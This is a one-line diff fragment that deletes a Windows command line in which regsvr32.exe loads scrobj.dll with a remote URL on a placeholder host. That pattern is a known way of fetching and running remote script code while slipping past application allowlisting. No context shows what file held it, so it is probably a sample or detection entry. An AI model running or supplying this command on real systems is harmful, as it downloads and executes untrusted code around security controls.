@@ -1,1 +1,0 @@
-regsvr32.exe /n -i:http://something scrobj.dll
